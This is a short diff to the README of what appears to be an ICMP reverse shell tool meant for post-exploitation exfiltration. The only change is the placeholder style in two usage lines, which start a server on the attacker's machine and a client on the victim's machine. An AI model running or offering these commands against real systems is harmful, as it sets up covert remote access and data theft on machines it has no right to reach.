@@ -4,6 +4,6 @@ Reverse shell over icmp, this could be used as part of post-exploitation exfihil
 
 
 # Usage
-attacker: sudo python3 server.py -i <interface> -d <victim address>
+attacker: sudo python3 server.py -i {interface} -d {victim address}
 
-victim: sudo python3 client.py -i <interface> -d <attacker address>
+victim: sudo python3 client.py -i {interface} -d {attacker address}
